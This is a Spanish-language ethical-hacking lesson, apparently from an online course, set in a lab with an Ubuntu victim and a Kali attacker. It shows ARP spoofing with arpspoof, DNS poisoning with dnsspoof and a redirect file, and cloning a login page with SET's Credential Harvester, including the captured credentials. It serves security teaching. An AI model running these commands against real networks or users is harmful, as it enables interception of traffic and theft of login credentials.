DNS _(Domain Name System)_ es un servicio que se encarga de resolver nombres en las redes y traducirlos a la correspondiente dirección IP.

El envenenamiento DNS consiste en poder contestar con una resolución falsa. En este ejercicio se aprovechará el ataque _man-in-the-middle_ visto en el tema anterior para poder suplantar al router, y ser el atacante el que responda a las consultas DNS.

Si esto se compagina con la herramienta SET para clonar webs se puede convertir en un ataque algo más complejo pero muy útil si se quiere obtener la típica información que un cliente intercambia con una web (como _usuario:contraseña_) ayudándonos de la falta de conocimiento de la víctima.

### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1723/#laboratorio)LABORATORIO

#### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1723/#redirección)Redirección

Para este laboratorio se dispone de una máquina Ubuntu (víctima) y un Kali (atacante). Ambos están interconectados a través de la red _172.16.123.0_, además del router, qué será el _default gateway_ de ambas. Esto último puede comprobarse con el comando `route -n`.

```
root@ubuntu:~# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref        Use Iface
0.0.0.0         172.16.123.2    0.0.0.0         UG    100    0        0 ens38
172.16.123.0    0.0.0.0         255.255.255.0   U     100    0        0 ens38
```

Y con el `arp -a` se verá la tabla donde se almacena la de las máquinas que conoce:

```
root@ubuntu:~# arp -a
? (172.16.123.137) at 00:0c:29:26:be:9b [ether] on ens38 (atacante)
? (172.16.123.2) at 00:50:56:eb:19:11 [ether] on ens38 (router)
...
```

Se debe lanzar el ataque visto en el tema anterior para que la víctima cambie la MAC del router por la del atacante y las comunicaciones pasen a través de éste último.

```
arpspoof -i eth1 -t 172.16.123.134 172.16.123.2
```

Obteniendo el resultado esperado:

```
root@ubuntu:~# arp -a
? (172.16.123.137) at 00:0c:29:26:be:9b [ether] on ens38
? (172.16.123.2) at 00:0c:29:26:be:9b [ether] on ens38
```

**Nota:** Recordatorio de que el ip_forwarding debe estar activado a 1.

Para comenzar el ataque DNS se creará un fichero con los nombres de los dominios a envenenar y la IP donde se quieren redirigir, como por ejemplo, se ha buscado un formulario HTTP por internet y se ha introducido en el fichero lo siguiente:

```
vi resolution.txt
|
| 172.16.123.137    login.hotpotatoes.net
|    
```

Para ver el funcionamiento de esta redirección se puede realizar un ping desde la víctima a dicho dominio obteniendo el siguiente resultado:

```
root@ubuntu:~# ping login.hotpotatoes.net
PING login.hotpotatoes.net (185.119.172.152) 56(84) bytes of data.
64 bytes from host53.servers.prgn.misp.co.uk (185.119.172.152): icmp_seq=1 ttl=128 time=31.6 ms
64 bytes from host53.servers.prgn.misp.co.uk (185.119.172.152)...
```

Se puede ver que está resolviendo dicho dominio a la IP **185.119.172.152** que por supuesto será la real. Si se lanza el ataque con el siguiente comando:

```
dnsspoof -i eth1 -f resolution.txt
```

y se vuelve a probar el ping:

```
root@ubuntu:~# ping login.hotpotatoes.net
PING login.hotpotatoes.net (172.16.123.137) 56(84) bytes of data.
64 bytes from login.hotpotatoes.net (172.16.123.137): icmp_seq=1 ttl=64 time=0.324 ms
64 bytes from login.hotpotatoes.net (172.16.123.137)...
```

Se puede comprobar cómo ha tenido éxito y se está realizando la redirección a la IP que se buscaba (atacante).

#### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1723/#clonado-de-la-web)Clonado de la web

Para este apartado se usará la herramienta SET con la que se va a suplantar la web haciéndole pensar a la víctima que está accediendo a una web legítima. Aprovechando que en dicha web existe un formulario de loging se puede intentar robar las credenciales de acceso a la misma. Para ello se va a utilizar la siguiente secuencia de comandos:

```
/usr/share/set/setoolkit
1 - Social Engineering Attacks
2 - Website Attack Vectors
3 - Credential Harvester Attack Method
2 - Site Cloner
IP atacante: 172.16.123.137
Web a clonar: login.hotpotatoes.net
```

Y cuando un usuario acceda con su login, SET devolverá dicha información.

```
('Array\n',)
('(\n',)
('    [type] => account\n',)
('    [username] => teacherName1\n',)
('    [password] => secret_password\n',)
('    [Submit] => Log In\n',)
(')\n',)
```